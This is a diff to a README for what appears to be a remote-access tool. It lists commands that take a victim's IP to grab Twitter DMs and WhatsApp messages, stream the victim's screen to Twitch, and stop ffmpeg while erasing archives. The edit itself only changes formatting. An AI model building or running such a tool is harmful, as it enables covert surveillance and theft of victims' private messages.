@@ -71,9 +71,14 @@ ENTER
 
 #### Ultra :squirrel: 
 
+:earth_africa:
+
 - /hackT ```IP``` (Get Twitter dms if the victim is authenticated) [Only web - W10]
 - /hackW ```IP``` (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]
-- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="15px" height="15px" /> /starttwitch ```IP``` ```STREAM_KEY``` (Start a video transmission on Twitch)
+
+<img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" /> 
+
+- /starttwitch ```IP``` ```STREAM_KEY``` (Start a video transmission on Twitch)
 - /stoptwitch ```IP``` (Stop ffmpeg.exe and erase all archives)
 
 ##### {TODO}
